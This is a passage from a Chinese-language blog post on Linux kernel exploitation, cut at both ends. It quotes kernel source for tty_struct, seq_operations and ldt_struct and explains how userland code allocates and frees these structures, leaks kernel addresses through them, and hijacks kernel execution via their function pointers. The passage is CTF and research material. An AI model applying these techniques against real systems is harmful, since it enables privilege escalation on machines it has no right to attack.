class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><h3 id="分配-x2F-释放"><a href="#分配-x2F-释放" class="headerlink" title="分配&#x2F;释放"></a>分配&#x2F;释放</h3><p>在注释中提示我们：当我们打开 tty 设备时内核中便会创建一个 tty_struct，通常情况下我们选择打开 <code>/dev/ptmx</code> 来在内核中分配一个 tty_struct 结构体，相应地当我们将其关闭时该结构体便会被释放回 slab&#x2F;slub 中</p><h3 id="魔数"><a href="#魔数" class="headerlink" title="魔数"></a>魔数</h3><p>tty_struct 的魔数为 <code>0x5401</code>，位于该结构体的开头，我们可以利用对该魔数的搜索以锁定该结构体（例如<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Auserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass">强网杯2021-noteook</a>)</p><h2 id="tty-operations"><a href="#tty-operations" class="headerlink" title="*tty_operations"></a><em>*tty_operations</em></h2><p>内核中 tty 设备的 ops 函数表，定义于 <code>/include/linux/tty_driver.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址"><a href="#内核-text-段地址" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>我们可以通过 tty_struct 的函数表 <code>tty_operations</code> 来泄露内核 <code>.text</code> 段的地址：</p><p>在 ptmx 被打开时内核通过 <code>alloc_tty_struct()</code> 分配 tty_struct 的内存空间，之后会将 tty_operations 初始化为<strong>全局变量</strong> <code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops </code>，在调试阶段我们可以先关掉 kaslr 开 root 从 <code>/proc/kallsyms</code> 中读取其偏移</p><p>开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是 ptm_unix98_ops 还是 pty_unix98_ops</p><h4 id="内核线性映射区（-direct-mapping-area）"><a href="#内核线性映射区（-direct-mapping-area）" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>tty_struct 的 <code>dev</code> 成员与 <code>driver</code> 成员都是通过 kmalloc 分配的，那么我们可以通过这两个成员泄露内核线性映射区的地址</p><blockquote><p>笔者目前暂时还没找到通过该结构泄露 page_offset_base 的方法</p></blockquote><h3 id="劫持内核执行流"><a href="#劫持内核执行流" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><p>若我们能够劫持相应 tty 设备（例如 &#x2F;dev&#x2F;ptmx）的 <code>tty_struct</code> 结构体与其内部的 <code>tty_operations</code> 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针，从而劫持内核执行流（例如<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Auserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass">强网杯2021-noteook</a>)</p><h1 id="0x02-seq-file-相关"><a href="#0x02-seq-file-相关" class="headerlink" title="0x02.seq_file 相关"></a>0x02.seq_file 相关</h1><p><strong>序列文件接口</strong>（Sequence File Interface）是针对 procfs 默认操作函数每次只能读取一页数据从而难以处理较大 proc 文件的情况下出现的，其为内核编程提供了更为友好的接口</p><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p>为了简化操作，在内核 <code>seq_file</code> 系列接口中为 file 结构体提供了 private data 成员 <code>seq_file</code> 结构体，该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> from;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">    <span class="type">size_t</span> pad_until;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">loff_t</span> read_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">    <span class="type">int</span> poll_event;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的函数表成员 op 在打开文件时通过 kmalloc 进行动态分配</p><h2 id="single-open"><a href="#single-open" class="headerlink" title="single_open"></a>single_open</h2><p> 为了更进一步简化内核接口的实现，seq_file 接口提供了 single_open() 这个简化的初始化 file 的函数，其定义于 <code>fs/seq_file.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">single_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">int</span> (*show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *),</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="type">int</span> res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op-&gt;start = single_start;</span><br><span class="line">        op-&gt;next = single_next;</span><br><span class="line">        op-&gt;stop = single_stop;</span><br><span class="line">        op-&gt;show = show;</span><br><span class="line">        res = seq_open(file, op);</span><br><span class="line">        <span class="keyword">if</span> (!res)</span><br><span class="line">            ((<span class="keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            kfree(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(single_open);</span><br></pre></td></tr></table></figure><p>其中我们可以看到的是在这里使用了 kmalloc 来分配 seq_operations 所需空间，这使得我们有机可乘</p><p>但是我们很难直接操纵 seq_file 结构体，这是因为其所需空间通过 <code>seq_open()</code> 中调用 kzalloc 从单独的 <code>seq_file_cache</code> 中分配</p><h2 id="seq-operations（kmalloc-32-GFP-KERNEL-ACCOUNT）：seq-file-函数表"><a href="#seq-operations（kmalloc-32-GFP-KERNEL-ACCOUNT）：seq-file-函数表" class="headerlink" title="seq_operations（kmalloc-32 | GFP_KERNEL_ACCOUNT）：seq_file 函数表"></a>seq_operations（kmalloc-32 | GFP_KERNEL_ACCOUNT）：seq_file 函数表</h2><p>该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，只定义了四个函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分配-x2F-释放-1"><a href="#分配-x2F-释放-1" class="headerlink" title="分配&#x2F;释放"></a>分配&#x2F;释放</h3><p>前面我们得知通过 single_open() 函数可以分配 seq_operations 结构体，阅读内核源码，我们注意到存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat_open()        &lt;--- stat_proc_ops.proc_open</span><br><span class="line">    single_open_size()</span><br><span class="line">        single_open()</span><br></pre></td></tr></table></figure><p>注意到 stat_open() 为 procfs 中的 stat 文件对应的 proc_ops 函数表中 open 函数对应的默认函数指针，在内核源码 <code>fs/proc/stat.c</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">stat_proc_ops</span> =</span> &#123;</span><br><span class="line">    .proc_flags    = PROC_ENTRY_PERMANENT,</span><br><span class="line">    .proc_open    = stat_open,</span><br><span class="line">    .proc_read_iter    = seq_read_iter,</span><br><span class="line">    .proc_lseek    = seq_lseek,</span><br><span class="line">    .proc_release    = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">proc_stat_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;stat&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;stat_proc_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">fs_initcall(proc_stat_init);</span><br></pre></td></tr></table></figure><p>即该文件对应的是 <code>/proc/id/stat</code> 文件，那么只要我们打开 <code>proc/self/stat</code> 文件便能分配到新的 seq_operations 结构体</p><p>对应地，在定义于 <code>fs/seq_file.c</code> 中的 <code>single_release()</code> 为 stat 文件的 proc_ops 的默认 release 指针，其会释放掉对应的 seq_operations 结构体，故我们只需要关闭文件即可释放该结构体</p><h3 id="数据泄露-1"><a href="#数据泄露-1" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-1"><a href="#内核-text-段地址-1" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>seq_operations 结构体中有着四个内核指针（笔者尚未求证具体是什么函数），若是能够读出这些指针的值我们便毫无疑问能泄露出内核 .text 段的基址</p><h3 id="劫持内核执行流-1"><a href="#劫持内核执行流-1" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong>（例如 <a href="https://www.anquanke.com/post/id/258160">InCTF 2021 - Kqueue</a>）</p><h1 id="0x03-ldt-struct-与-modify-ldt-系统调用"><a href="#0x03-ldt-struct-与-modify-ldt-系统调用" class="headerlink" title="0x03.ldt_struct 与 modify_ldt 系统调用"></a>0x03.ldt_struct 与 modify_ldt 系统调用</h1><p>ldt 即<strong>局部段描述符表</strong>（<strong>Local Descriptor Table</strong>），其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引，在内核中与 ldt 相关联的结构体为 ldt_struct</p><p>在 TCTF&#x2F;0CTF 2021 FINAL 当中由 <a href="https://github.com/yzloser">yzloser 师傅</a>展示给我们的一种_十分美妙的利用方式_——通过 modify_ldt 系统调用来操纵内核中的 ldt_struct 以进行内核空间中的任意读写</p><p>完整利用过程的例子可以参见<a href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/">TCTF2021 FINAL - kernote</a></p><h2 id="modify-ldt-系统调用"><a href="#modify-ldt-系统调用" class="headerlink" title="modify_ldt 系统调用"></a>modify_ldt 系统调用</h2><p>该系统调用可以用来操纵对应进程的 ldt_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ldt-struct-kmalloc-16-slub-x2F-kmalloc-32-slab"><a href="#ldt-struct-kmalloc-16-slub-x2F-kmalloc-32-slab" class="headerlink" title="ldt_struct:  kmalloc-16(slub)&#x2F;kmalloc-32(slab)"></a>ldt_struct:  kmalloc-16(slub)&#x2F;kmalloc-32(slab)</h2><p>该结构体定义于内核源码 <code>arch/x86/include/asm/mmu_context.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分配（GFP-KERNEL）：modify-ldt-系统调用——write-ldt"><a href="#分配（GFP-KERNEL）：modify-ldt-系统调用——write-ldt" class="headerlink" title="分配（GFP_KERNEL）：modify_ldt 系统调用——write_ldt()"></a>分配（GFP_KERNEL）：modify_ldt 系统调用——write_ldt()</h3><p> 定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们注意到在 write_ldt() 当中会使用 alloc_ldt_struct() 函数来为新的 ldt_struct 分配空间，随后将之应用到进程， alloc_ldt_struct() 函数定义于 <code>arch/x86/kernel/ldt.c</code> 中，我们主要关注如下逻辑： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即我们可以通过 modify_ldt 系统调用来分配新的 ldt_struct</p><h3 id="数据泄露：modify-ldt-系统调用——read-ldt"><a href="#数据泄露：modify-ldt-系统调用——read-ldt" class="headerlink" title="数据泄露：modify_ldt 系统调用——read_ldt()"></a>数据泄露：modify_ldt 系统调用——read_ldt()</h3><p> 定义于 